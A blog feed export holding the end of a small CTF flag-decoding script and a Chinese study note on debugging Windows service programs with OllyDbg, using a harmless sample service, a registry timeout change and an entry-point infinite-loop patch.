class="hljs-string">&quot;rb&quot;</span>) <span class="hljs-keyword">as</span> f:<br>        data = f.read()<br>    v4=<span class="hljs-number">34</span><br>    v5=<span class="hljs-number">0</span><br>    index=<span class="hljs-built_in">len</span>(data)<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(data)):<br>        <br>        flag_maybe = (data[j] ^v4)-v5<br>        <span class="hljs-built_in">print</span>(<span class="hljs-built_in">chr</span>(flag_maybe), end=<span class="hljs-string">&#x27;&#x27;</span>)<br>        v4 += <span class="hljs-number">34</span><br>        v4 &amp;=<span class="hljs-number">0xFF</span><br>        v5 = (v5 + <span class="hljs-number">2</span>) &amp; <span class="hljs-number">0xF</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Web</category>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Web</tag>
      
      <tag>CTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>第54章 调试练习1:服务</title>
    <link href="/1999/05/04/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/%E7%AC%AC54%E7%AB%A0%20%E8%B0%83%E8%AF%95%E7%BB%83%E4%B9%A01%EF%BC%9A%E6%9C%8D%E5%8A%A1/"/>
    <url>/1999/05/04/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/%E7%AC%AC54%E7%AB%A0%20%E8%B0%83%E8%AF%95%E7%BB%83%E4%B9%A01%EF%BC%9A%E6%9C%8D%E5%8A%A1/</url>
    
    <content type="html"><![CDATA[<p>第54章调试练习1:服务</p><p>从现在开始，我们将用多种示例程序练习调试，并通过这些调试练习进一步提高各位的调试水平。第一个调试示例是Windows服务程序，本章主要学习其调试方法。</p><p>服务程序比较难调试，有时，即使是逆向分析经验丰富的入调试起来也并非易事。本章主要学习服务程序的调试方法，帮助各位掌握。</p><h1 id="54-1-服务进程的工作原理"><a href="#54-1-服务进程的工作原理" class="headerlink" title="54.1 服务进程的工作原理"></a>54.1 服务进程的工作原理</h1><p>服务（Service）程序由SCM（Service Control Manager，服务控制管理器）管理。运行服务程序时，需要由服务控制器（Service Controller）执行启动命令。服务控制器向SCM提出服务控制请求，SCM向服务程序传递控制命令，并接收其返回的值（参考图54-1）。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/05/img/%E7%AC%AC54%E7%AB%A0%20%E8%B0%83%E8%AF%95%E7%BB%83%E4%B9%A01%EF%BC%9A%E6%9C%8D%E5%8A%A1.assets/image-20220328140612349.png#crop=0&crop=0&crop=1&crop=1&id=eGcSI&originHeight=170&originWidth=455&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="></p><p>服务控制器无法直接向服务程序下达命令，必须通过SCM传达。</p><h2 id="54-1-1-服务控制器"><a href="#54-1-1-服务控制器" class="headerlink" title="54.1.1 服务控制器"></a>54.1.1 服务控制器</h2><p>Windows默认提供了服务控制器，在“控制面板”中单击“管理工具”，打开“管理工具”窗口，双击“服务”图标即可运行服务控制器，如图54-3所示（也可以直接在控制台窗口输入 “services.msc” 命令）。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/05/img/%E7%AC%AC54%E7%AB%A0%20%E8%B0%83%E8%AF%95%E7%BB%83%E4%B9%A01%EF%BC%9A%E6%9C%8D%E5%8A%A1.assets/image-20220328140922887.png#crop=0&crop=0&crop=1&crop=1&id=A1gBH&originHeight=606&originWidth=823&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="></p><p>图54-3列出了设置在系统中的所有服务列表，在服务列表中选择想要控制的服务即可（启动&#x2F;停止&#x2F;暂停&#x2F;重启）。选中指定服务，单击“启动服务”按钮，弹出“服务控制”窗口，显示正在启动指定服务信息，如图所示。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/05/img/%E7%AC%AC54%E7%AB%A0%20%E8%B0%83%E8%AF%95%E7%BB%83%E4%B9%A01%EF%BC%9A%E6%9C%8D%E5%8A%A1.assets/image-20220328141505261.png#crop=0&crop=0&crop=1&crop=1&id=PwP3k&originHeight=235&originWidth=527&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="></p><p>服务进程正常启动后，图54-4中的服务控制窗口消失，服务状态变为“已启动”。下面详细了解服务启动过程。</p><h2 id="54-1-2服务启动过程"><a href="#54-1-2服务启动过程" class="headerlink" title="54.1.2服务启动过程"></a>54.1.2服务启动过程</h2><p>图54-5大致描述了服务程序的启动过程。</p><p>所有服务程序都是由外部（服务控制器）调用StartService() API启动的（参考：若服务为自启动服务，则由SCM调用StartService()启动）。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/05/img/%E7%AC%AC54%E7%AB%A0%20%E8%B0%83%E8%AF%95%E7%BB%83%E4%B9%A01%EF%BC%9A%E6%9C%8D%E5%8A%A1.assets/image-20220328141133671.png#crop=0&crop=0&crop=1&crop=1&id=VBDsL&originHeight=437&originWidth=716&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="></p><p><strong>服务进程启动过程</strong></p><p>（1）服务控制器调用StartService()</p><p>服务控制器调用StartService()时，SCM会创建相应服务进程，然后执行服务进程的EP代码。</p><p>（2）服务进程调用StartServiceCtrlDispatcher()</p><p>为了以服务形式运行，必须在服务进程内部调用StartServiceCtrlDispatcher() API来注册服务主函数SvcMain()的地址。调用StartServiceCtrlDispatcher()时，返回服务控制器的StartService()函 数。SCM调用服务进程的服务主函数SvcMain()。</p><p>（3）服务进程调用SetServiceStatus()</p><p>虽然已经创建了服务进程，但尚未以服务形式运行。当前状态仍为SERVICE_START_PENDING。在服务主函数SvcMain()内部调用SetServiceStatus（SERVICE_RUNNING）API后，才正式以服务进程形式运行（此时图54-4中的服务控制状态窗口消失）。</p><p>综上所述，服务程序先由SCM创建进程，然后控制转移给SvcMain()函数，调用SetServiceStatus<br>（SERVICE_RUNNING）API,这样才能以服务进程的形式运行。对服务进程尚不熟悉的朋友，请<br>认真阅读上面关于服务进程启动过程的描述。下面通过一个简单的示例程序（DebugMe1.exe）来<br>帮助各位进一步了解服务进程的工作原理。</p><blockquote><p>示例程序在Windows XP&#x2F;7（32位）中正常运行</p></blockquote><h1 id="54-2-DebugMe1-exe-示例讲解"><a href="#54-2-DebugMe1-exe-示例讲解" class="headerlink" title="54.2 DebugMe1 .exe 示例讲解"></a>54.2 DebugMe1 .exe 示例讲解</h1><p>DebugMe1.exe进程以2种形式运行，一种为常规运行形式，负责服务的安装与删除；另一种<br>由SCM以服务形式运行。常规运行时需要接收运行参数（install或者uninstall）,以服务形式运行<br>时则不需要。</p><h2 id="54-2-1安装服务"><a href="#54-2-1安装服务" class="headerlink" title="54.2.1安装服务"></a>54.2.1安装服务</h2><p>为了将示例程序安装为服务，我们先将其复制到合适的文件夹，然后运行图54-6所示的命令。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/05/img/%E7%AC%AC54%E7%AB%A0%20%E8%B0%83%E8%AF%95%E7%BB%83%E4%B9%A01%EF%BC%9A%E6%9C%8D%E5%8A%A1.assets/image-20220328142516586.png#crop=0&crop=0&crop=1&crop=1&id=hJTzx&originHeight=174&originWidth=855&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="></p><p>服务安装成功后，可以在服务列表中看到，如图54-7所示。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/05/img/%E7%AC%AC54%E7%AB%A0%20%E8%B0%83%E8%AF%95%E7%BB%83%E4%B9%A01%EF%BC%9A%E6%9C%8D%E5%8A%A1.assets/image-20220328142552207.png#crop=0&crop=0&crop=1&crop=1&id=U9oyw&originHeight=248&originWidth=828&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="></p><p>从服务列表可以看到，服务名为SvcTest。选中它，在菜单栏中依次选择“操作-属性”菜单，打开属性窗口即可查看有关该服务的更多信息（也可以选择服务，在鼠标右键中选择“属性”菜单），如图54-8所示。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/05/img/%E7%AC%AC54%E7%AB%A0%20%E8%B0%83%E8%AF%95%E7%BB%83%E4%B9%A01%EF%BC%9A%E6%9C%8D%E5%8A%A1.assets/image-20220328142645134.png#crop=0&crop=0&crop=1&crop=1&id=PDnn8&originHeight=344&originWidth=826&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="></p><p>弹出服务属性对话框，如图54-9所示。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/05/img/%E7%AC%AC54%E7%AB%A0%20%E8%B0%83%E8%AF%95%E7%BB%83%E4%B9%A01%EF%BC%9A%E6%9C%8D%E5%8A%A1.assets/image-20220328142716333.png#crop=0&crop=0&crop=1&crop=1&id=ksT6v&originHeight=553&originWidth=561&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="></p><p>服务属性对话框的“常规”选项卡中包含了所有服务相关信息。SvcTest服务程序的可执行文件路径为：C:\Users\admin\Desktop\test\DebugMe1.exe（示例程序的安装路径），并且服务的“启动类型”为“手动”（需要运行时要手动启动），当前的“服务状态”为“已停止”。</p><blockquote><p>服务启动类型大致可分为手动与自动这2种。为了方便，上述示例程序采用了手动启动方式。若启动类型为自动方式，则系统启动时即运行服务。</p></blockquote><h2 id="54-2-2-启动服务"><a href="#54-2-2-启动服务" class="headerlink" title="54.2.2 启动服务"></a>54.2.2 启动服务</h2><p>下面开始启动服务，选中SvcTest服务，单击“启动服务”按钮，如图54-10所示。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/05/img/%E7%AC%AC54%E7%AB%A0%20%E8%B0%83%E8%AF%95%E7%BB%83%E4%B9%A01%EF%BC%9A%E6%9C%8D%E5%8A%A1.assets/image-20220328143024329.png#crop=0&crop=0&crop=1&crop=1&id=GrjJT&originHeight=229&originWidth=830&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="></p><p>服务成功启动后，服务进程（DebugMe1.exe）也就运行起来，如图54-11所示。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/05/img/%E7%AC%AC54%E7%AB%A0%20%E8%B0%83%E8%AF%95%E7%BB%83%E4%B9%A01%EF%BC%9A%E6%9C%8D%E5%8A%A1.assets/image-20220328143844359.png#crop=0&crop=0&crop=1&crop=1&id=b4BNi&originHeight=462&originWidth=1091&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="></p><p>图54-11中需要注意的是，SvcTest服务的进程（DebugMe1.exe）是以services.exe进程的子进程（Child）形式运行的。其实，所有服务进程都以该形式运行。Services.exe进程就是SCM。示例程序DebugMe1.exe的功能相当简单，它经过一定时间间隔输岀调试字符串（调用OutputDebugString() API）。使用DebugView实用工具可以查看输出的调试字符串，如图54-12所示。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/05/img/%E7%AC%AC54%E7%AB%A0%20%E8%B0%83%E8%AF%95%E7%BB%83%E4%B9%A01%EF%BC%9A%E6%9C%8D%E5%8A%A1.assets/image-20220328143928740.png#crop=0&crop=0&crop=1&crop=1&id=w3UY3&originHeight=212&originWidth=745&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="></p><p>Windows Vista以上的系统中需要用管理员权限来运行DebugView，在菜单栏中依次选择Capture-Capture Global Win32菜单才能捕获输出的调试字符串，如图54-13所示。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/05/img/%E7%AC%AC54%E7%AB%A0%20%E8%B0%83%E8%AF%95%E7%BB%83%E4%B9%A01%EF%BC%9A%E6%9C%8D%E5%8A%A1.assets/image-20220328143959804.png#crop=0&crop=0&crop=1&crop=1&id=FN2vb&originHeight=410&originWidth=741&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="></p><h2 id="54-2-3-源代码"><a href="#54-2-3-源代码" class="headerlink" title="54.2.3 源代码"></a>54.2.3 源代码</h2><p>下面看看DebugMe1.exe的源代码（DebugMe1.cpp）。</p><p><strong>#main()</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> _tmain(<span class="hljs-type">int</span> argc, TCHAR *argv[])<br>&#123; <br>    TCHAR szPath[MAX_PATH] = &#123;<span class="hljs-number">0</span>,&#125;;<br>    SERVICE_TABLE_ENTRY DispatchTable[] = <br>    &#123; <br>        &#123; SVCNAME, (LPSERVICE_MAIN_FUNCTION)SvcMain &#125;, <br>        &#123; <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span> &#125; <br>    &#125;; <br><br>    <span class="hljs-keyword">if</span>( argc == <span class="hljs-number">1</span> )<br>    &#123;<br>        <span class="hljs-keyword">if</span> (!StartServiceCtrlDispatcher( DispatchTable )) <br>        &#123; <br>            _tprintf(<span class="hljs-string">L&quot;StartServiceCtrlDispatcher() failed!!! [%d]\n&quot;</span>, <br>                GetLastError()); <br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>( argc == <span class="hljs-number">2</span> )<br>    &#123;<br>        <span class="hljs-keyword">if</span>( !GetModuleFileName(<span class="hljs-literal">NULL</span>, szPath, MAX_PATH) )<br>        &#123;<br>            _tprintf(<span class="hljs-string">L&quot;GetModuleFileName() failed! [%d]\n&quot;</span>, <br>                GetLastError());<br>            <span class="hljs-keyword">return</span>;<br>        &#125;<br><br>        <span class="hljs-keyword">if</span>( _tcsicmp(argv[<span class="hljs-number">1</span>], <span class="hljs-string">L&quot;install&quot;</span>) == <span class="hljs-number">0</span> )<br>        &#123;<br>            InstallService(SVCNAME, szPath);<br>            <span class="hljs-keyword">return</span>;<br>        &#125;<br>        <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>( _tcsicmp(argv[<span class="hljs-number">1</span>], <span class="hljs-string">L&quot;uninstall&quot;</span>) == <span class="hljs-number">0</span> )<br>        &#123;<br>            UninstallService(SVCNAME);<br>            <span class="hljs-keyword">return</span>;<br>        &#125;<br>        <span class="hljs-keyword">else</span><br>        &#123;<br>            _tprintf(<span class="hljs-string">L&quot;Wrong parameters!!!\n&quot;</span>);<br>        &#125;<br>    &#125;<br><br>    _tprintf(<span class="hljs-string">L&quot;\nUSAGE : %s &lt;install | uninstall&gt;\n&quot;</span>, argv[<span class="hljs-number">0</span>]);<br>&#125;<br></code></pre></td></tr></table></figure><p>从main()函数代码可以看到，根据有无运行参数，程序可分别以服务模式（无参数）或常规模式（有参数）运行。以服务模式运行时会调用StartServiceCtrlDispatcher() API，启动服务主函数（SvcMain()）；以常规模式运行时，根据所给参数的种类，分别调用InstallService()&#x2F;UninstallService()函数，它们分别用来安装或卸载服务（由于这2个函数比较简单，此处不再详细说明，请各位参考示例源码以及MSDN分析）。</p><p><strong>#SvcMain()</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs c">VOID WINAPI <span class="hljs-title function_">SvcMain</span><span class="hljs-params">(DWORD argc, LPCTSTR *argv)</span><br>&#123;<br>    <span class="hljs-comment">// Service Control Handler</span><br>    g_hServiceStatusHandle = RegisterServiceCtrlHandler( <br>        SVCNAME, <br>        SvcCtrlHandler);<br>    <span class="hljs-keyword">if</span>( !g_hServiceStatusHandle )<br>    &#123; <br>        OutputDebugString(<span class="hljs-string">L&quot;RegisterServiceCtrlHandler() failed!!!&quot;</span>); <br>        <span class="hljs-keyword">return</span>; <br>    &#125; <br><br>    <span class="hljs-comment">// Service Status -&gt; SERVICE_RUNNING</span><br>    g_ServiceStatus.dwCurrentState = SERVICE_RUNNING;<br>    SetServiceStatus(g_hServiceStatusHandle, &amp;g_ServiceStatus);<br><br>    <span class="hljs-comment">// Print debug string</span><br>    <span class="hljs-keyword">while</span>( TRUE )<br>    &#123;<br>        OutputDebugString(<span class="hljs-string">L&quot;[SvcTest] service is running...&quot;</span>);<br>        Sleep(<span class="hljs-number">3</span> * <span class="hljs-number">1000</span>);        <span class="hljs-comment">// 3 sec</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>以上是SvcMain()函数代码。先调用RegisterServiceCtrlHandler() API来注册服务处理函数（SvcCtrlHandler），然后调用SetServiceStatus() API将服务状态修改为SERVICE_RUNNING（此时图54-4中的服务控制窗口消失）。最后在while循环中每隔3秒调用1次OutputDebugString()函数，输出调试字符串。本示例服务（SvcTest）的功能非常简单，仅用来输岀调试字符串。</p><h1 id="54-3-服务进程的调试"><a href="#54-3-服务进程的调试" class="headerlink" title="54.3 服务进程的调试"></a>54.3 服务进程的调试</h1><p>要想准确调试服务程序，就不能像对待普通程序一样直接用调试器启动并调试，而需要将调试器附加到SCM运行的服务进程上。这正是调试服务进程的困难之处，但理解了服务的工作原理后，解决起来就变得相当简单。</p><h2 id="54-3-1-问题在于SCM"><a href="#54-3-1-问题在于SCM" class="headerlink" title="54.3.1 问题在于SCM"></a>54.3.1 问题在于SCM</h2><p>服务进程由SCM运行，这是服务进程调试的核心所在。</p><p>□服务进程由SCM运行。</p><p>□服务核心代码主要存在于服务主函数（SvcMain()）中。</p><p>□服务主函数（SvcMain()）由SCM正常调用。</p><p>我们要调试的是服务主函数（SvcMain()）,但使用调试器打开服务程序的可执行文件并开始调试时，服务主函数并不运行，所以调试时需要将SCM运行的服务进程附加到调试器。</p><h2 id="54-3-2-调试器无所不能"><a href="#54-3-2-调试器无所不能" class="headerlink" title="54.3.2 调试器无所不能"></a>54.3.2 调试器无所不能</h2><p>使用调试器打开服务可执行文件无法直接调试服务主函数（SvcMainO）代码。原因在于，SCM不会调用服务主函数（因非由SCM运行，故不能运行它）。但这并不意味着没有解决方法。因为调试器拥有被调试进程的强大权限，所以可以先将调试位置强制指定为服务主函数（如：OllyDbg的New origin here菜单），然后再调试。使用这种方法调试服务主函数不会有什么大问题，如果这种方法有效，建议各位使用。不过，使用这种方法必须拥有强大的调试器权限才行，服务进程行为比较复杂时，使用该方法就可能无法顺利完成调试。</p><h2 id="54-3-3-常用方法"><a href="#54-3-3-常用方法" class="headerlink" title="54.3.3 常用方法"></a>54.3.3 常用方法</h2><p>调试服务最常用的方法是，先将SCM运行的服务进程附加到调试器后再调试。思路很简单，<br>但执行方法可能有问题。因为SCM运行服务后再进行附加操作的话，此时的核心代码（服务主函<br>数）已开始运行。因此，需要在SCM创建服务进程并运行EP代码前附加到调试器，这需要一定<br>的调试技巧，后面的练习示例中将介绍。</p><h1 id="54-4-服务调试练习"><a href="#54-4-服务调试练习" class="headerlink" title="54.4 服务调试练习"></a>54.4 服务调试练习</h1><p>下面以DebugMe1.exe服务程序为例练习服务调试。</p><h2 id="54-4-1-直接调试：强制设置EIP"><a href="#54-4-1-直接调试：强制设置EIP" class="headerlink" title="54.4.1 直接调试：强制设置EIP"></a>54.4.1 直接调试：强制设置EIP</h2><p>首先，使用调试器直接打开服务程序，学习服务程序的调试方法。分析调试服务程序的EP代码与main()函数代码时，采用的调试方法与调试普通应用程序没有什么不同。但一般而言，服务程序的主要代码存在于服务主函数（SvcMain()）与服务处理函数（SvcHandler()）中。</p><p>由调试器而非SCM运行的服务进程不会调用SvcMain()与SvcHandler()函数。所以需要先得到这两个函数的地址，然后再将调试位置移动到那里。在OllyDbg调试器中打开DebugMe1.exe程序，调试运行到main()函数处显示代码，如图54-14所示。</p><p>在40106C地址处可以看到StartServiceCtrlDispatcher() API。对于EXE文件形态的Windows服务程序而言，必须在其EP代码内部调用StartServiceCtrlDispatcher() API，将服务主函数（SvcMain()）的地址通知给SCM。所以，查找该API即可获得SvcMain()地址。</p><blockquote><p>对于DLL文件形式的Windows服务而言，服务主函数（默认为ServiceMain）为导出函数，SCM会调用运行导出函数，所以不需要另外调用StartServiceCtrlDispatcher()API（若想把服务主函数的名称修改为其他名称（非ServiceMain），只要向相关注册表注册即可）。</p></blockquote><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/05/img/%E7%AC%AC54%E7%AB%A0%20%E8%B0%83%E8%AF%95%E7%BB%83%E4%B9%A01%EF%BC%9A%E6%9C%8D%E5%8A%A1.assets/image-20220328152443217.png#crop=0&crop=0&crop=1&crop=1&id=jUfOw&originHeight=668&originWidth=1218&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="></p><p>StartServiceCtrIDispatcher() API 的 pServiceTable参数为 SERVICE_TABLE_ENTRY结构体指针。跟踪该结构体即可得到服务名称字符串（“SvcMain”）与服务主函数（SvcMain()）的地址。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">SERVICE_TABLE_ENTRY</span> &#123;</span><br>  LPSTR                    lpServiceName;<br>  LPSERVICE_MAIN_FUNCTION  lpServiceProc;<br>&#125; SERVICE_TABLE_ENTRY, *LPSERVICE_TABLE_ENTRY;<br></code></pre></td></tr></table></figure><p>图54-14中，调试运行到40106C地址处的CALL DWORD PTR DS:[StartServiceCtrlDispatcher()]指令后，查看栈，如图54-15所示。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/05/img/%E7%AC%AC54%E7%AB%A0%20%E8%B0%83%E8%AF%95%E7%BB%83%E4%B9%A01%EF%BC%9A%E6%9C%8D%E5%8A%A1.assets/image-20220328154133937.png#crop=0&crop=0&crop=1&crop=1&id=IvUWN&originHeight=109&originWidth=1350&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="></p><p>pServiceTable（12FD24）的第一个成员（40A9CC）为 “SvcHost” 字符串，第二个成员（401320）为SvcMain()函数的地址。</p><blockquote><p>在图54-14中可以看到，从401038地址开始为设置SERVICE_TABLE_ENTRY结构体的代码。</p></blockquote><p>使用OllyDbg调试器中的Ctrl+G命令，转到SvcMain()函数地址处（401320），SvcMain()函数如图54-17所示。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/05/img/%E7%AC%AC54%E7%AB%A0%20%E8%B0%83%E8%AF%95%E7%BB%83%E4%B9%A01%EF%BC%9A%E6%9C%8D%E5%8A%A1.assets/image-20220328154414269.png#crop=0&crop=0&crop=1&crop=1&id=TvUe4&originHeight=422&originWidth=1089&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="></p><p>为了从401320地址开始调试，需要先将调试位置（准确地说，是被调试进程的EIP值）修改到此处。单击鼠标右键，在弹出菜单中选择New origin here选项，调试位置即被修改为服务主函数（401320），除EIP寄存器外，其他值（栈、除EIP外的寄存器）都保持不变。</p><p>现在开始调试SvcMain()即可。</p><blockquote><p>采用以上方式调试服务主函数（SvcMain()）时需要注意：由于服务进程不是由SCM 正常启动运行的，所以调用与服务相关的部分API时可能引发异常。比如，在图54-17中执行40132A 地址处的 CALL DWORD PTR DS:[RegisterServiceCtrlHandlerW]指令，就会发生EXCEPTION_ACCESS_VIOLATION（0xC0000005）异常。为了 避免这种异常，可以在调试器中强制跳过对相关API的调用，也可以像图54-20一样设置调试器选项。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/05/img/%E7%AC%AC54%E7%AB%A0%20%E8%B0%83%E8%AF%95%E7%BB%83%E4%B9%A01%EF%BC%9A%E6%9C%8D%E5%8A%A1.assets/image-20220328154939448.png#crop=0&crop=0&crop=1&crop=1&id=kBYjU&originHeight=497&originWidth=611&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="></p><p>若在OllyDbg调试器中复选Memory access violation项，就会忽略内存非法访问异常，调试可以继续。</p></blockquote><p>以上方法虽然不是什么硬性规定，但大多数情况下用来调试服务主函数是不会有什么大问题的。当然，有时上面的方法也会失灵，无法正常帮助我们完成调试，此时可以尝试接下来要讲解的方法。</p><h2 id="54-4-2-服务调试的常用方法：“附加”方式"><a href="#54-4-2-服务调试的常用方法：“附加”方式" class="headerlink" title="54.4.2 服务调试的常用方法：“附加”方式"></a>54.4.2 服务调试的常用方法：“附加”方式</h2><p>根据不同情况，我们有时需要将SCM正式运行的服务进程附加到调试器调试。这一过程需要应用一些简单的调试技术。为了帮助各位更好地理解该过程，下面用图54-21简单描述调试技术的具体操作步骤（以调试EP代码为准）。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/05/img/%E7%AC%AC54%E7%AB%A0%20%E8%B0%83%E8%AF%95%E7%BB%83%E4%B9%A01%EF%BC%9A%E6%9C%8D%E5%8A%A1.assets/image-20220328200439441.png#crop=0&crop=0&crop=1&crop=1&id=VB33B&originHeight=334&originWidth=363&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="></p><p>以上操作流程的核心是，将服务进程附加到调试器前要进入无限循环，使服务进程的重要代码无法运行。原理非常简单，但具体实施时要充分考虑Service Start Timeout（服务启动超时）这一因素，确保上述操作在规定时间内（默认为30秒）完成。</p><blockquote><p>启动服务后，SCM会在一定时间内（Service Start Timeout）等待服务状态变为STATUS_RUNNING。若规定时间内服务状态未改变，SCM就会引发ERROR_SERVICE_REQUEST_TIMEOUT错误，然后终止相关服务进程。</p></blockquote><p>也就是说，将服务进程附加到调试器后的30秒内，必须把服务进程的状态变更为STATUS_RUNNING。而要更改服务状态，必须调用位于服务主函数的SetServiceStatus() API。但30秒内完成以上操作流程相当困难，所以具体操作前需要增加服务启动超时时间。</p><p><strong>（1）安装服务</strong></p><p>首先将示例程序（DebugMe1.exe）安装为Windows服务（参考图54-6）。</p><p><strong>（2）增加服务启动超时时间</strong></p><p>运行注册表编辑器（regedit.exe），创建ServicesPipeTimeout注册表项（DWORD类型），如下所示（参考图54-22）。</p><blockquote><p>注意注意，这里书中写的是ServicePipeTimeout，少了一个s，这样的话是不起作用的</p></blockquote><p><code>[HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control] ServicesPipeTimeout</code></p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/05/img/%E7%AC%AC54%E7%AB%A0%20%E8%B0%83%E8%AF%95%E7%BB%83%E4%B9%A01%EF%BC%9A%E6%9C%8D%E5%8A%A1.assets/image-20220328202059906.png#crop=0&crop=0&crop=1&crop=1&id=d6Ymu&originHeight=402&originWidth=1158&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="></p><p>ServicesPipeTimeout并不存在默认值，所以需要创建新值，单位为毫秒（Millisecond），这里<br>设置其值为60 x 60 x 24 x 1000&#x3D;86400000（24小时），这个时间足够了。设置好后重启系统，使之<br>生效，然后就有足够时间调试了。</p><blockquote><p>设置ServicesPipeTimeout值会对系统中的所有服务产生影响，尽量不要在重要的电脑中设置它，建议各位在调试专用电脑中设置。</p></blockquote><p><strong>（3）修改文件：设置无限循环</strong></p><p>接下来，开始向服务可执行文件（EXE或者DLL）的EP地址覆写无限循环（Infinite Loop）代码。使用Stud_PE实用工具，查看DebugMe1.exe文件的EP地址（RVA&#x2F;RAW），如图54-23所示。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/05/img/%E7%AC%AC54%E7%AB%A0%20%E8%B0%83%E8%AF%95%E7%BB%83%E4%B9%A01%EF%BC%9A%E6%9C%8D%E5%8A%A1.assets/image-20220328203454672.png#crop=0&crop=0&crop=1&crop=1&id=s6ql6&originHeight=450&originWidth=623&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="></p><p>EP的文件偏移（FileOffset&#x3D;RAW）为C24。然后使用HxD实用工具转到该地址处，如图54-24所示。</p><p><img 